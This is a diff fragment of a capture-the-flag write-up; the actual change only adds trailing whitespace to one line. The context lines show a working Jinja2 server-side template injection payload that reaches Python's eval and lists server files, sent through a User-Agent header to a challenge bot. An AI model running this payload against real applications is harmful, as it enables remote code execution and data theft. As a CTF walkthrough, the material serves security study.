@@ -62,7 +62,7 @@ Let us use our payload from DotDashDot (https://github.com/czlucius/ctf-writeups
 {% for c in [].__class__.__base__.__subclasses__() %}   {% if c.__name__ == 'catch_warnings' %}     {% for b in c.__init__.__globals__.values() %}     {% if b.__class__ == {}.__class__ %}       {% if 'eval' in b.keys() %}         {{ b['eval']('__import__("os").listdir()') }}       {% endif %}     {% endif %}     {% endfor %}   {% endif %} {% endfor %}
 ```
 
-Since it contains both ' and ", let us use Python's triple quote: `"""`
+Since it contains both ' and ", let us use Python's triple quote: `"""`  
 `requests.get("http://tennisracket2-grade-bot:5000", headers={"User-Agent": """{% for c in [].__class__.__base__.__subclasses__() %}   {% if c.__name__ == 'catch_warnings' %}     {% for b in c.__init__.__globals__.values() %}     {% if b.__class__ == {}.__class__ %}       {% if 'eval' in b.keys() %}         {{ b['eval']('__import__("os").listdir()') }}       {% endif %}     {% endif %}     {% endfor %}   {% endif %} {% endfor %}"""})`
 ![image](https://user-images.githubusercontent.com/58442255/233848540-4da569bb-dc7c-42ba-ad19-aebd3d18d263.png)   
 We see the flag file!
